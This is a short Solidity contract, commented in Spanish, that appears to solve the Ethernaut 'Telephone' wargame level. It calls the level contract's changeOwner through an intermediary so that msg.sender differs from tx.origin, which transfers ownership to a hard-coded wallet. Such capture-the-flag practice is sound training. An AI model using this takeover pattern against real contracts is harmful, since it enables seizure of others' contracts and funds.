// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "./Telephone.sol"; // Importamos el contrato del telefono para interactuar

contract ContratoIntermediario {

    address telefonoAddress = 0x0407eEc6eBFD8932c593decA20db03387C2D12B9; // Dirección del contrato de ethernaut

    Telephone telephone = Telephone(telefonoAddress); // Creamos una instancia del contrato

    function getOwner() public {
        telephone.changeOwner(0x1346789F439E252b026C69A7E059DC2D0Be43E1d); // Llamamos a la funcion de cambiar owner del contrato del telefono y pasamos nuestra wallet
    }
}
